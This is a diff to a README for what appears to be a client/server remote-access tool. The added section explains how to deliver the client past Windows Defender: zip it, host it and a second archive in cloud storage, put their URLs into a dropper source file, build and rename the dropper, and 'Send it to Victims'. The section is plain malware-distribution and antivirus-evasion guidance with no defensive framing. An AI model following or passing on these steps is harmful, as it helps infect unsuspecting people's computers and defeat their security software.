@@ -15,3 +15,10 @@
 5. Run the application:
    - Start the **Server** first.
    - Then run the **Client** to test the connection.
+
+## How to Send Client.exe (Bypass Window Defender)
+1. Package Client.exe into a ZIP archive.
+2. Upload Client.zip and Pikachu.zip to cloud storage or Server
+3. Replace the URL of Client.Zip and Pikachu.zip in Bypass_WindowDefender.cpp
+4. build Bypass_WindowDefender.cpp to .exe, rename it
+5. Send it to Victims
